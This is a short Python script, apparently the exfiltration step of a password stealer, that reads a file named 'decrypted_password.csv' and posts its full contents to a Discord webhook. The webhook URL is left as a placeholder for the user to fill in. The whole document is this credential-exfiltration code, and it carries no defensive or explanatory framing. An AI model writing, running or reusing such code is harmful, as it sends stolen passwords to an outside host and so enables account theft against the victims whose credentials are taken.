from discord_webhook import DiscordWebhook
file_path = 'decrypted_password.csv'
 
with open(file_path, 'r') as file:
    file_content = file.read()
webhook = DiscordWebhook(url="YOUR WEBHOOK HERE", content=file_content)
response = webhook.execute()
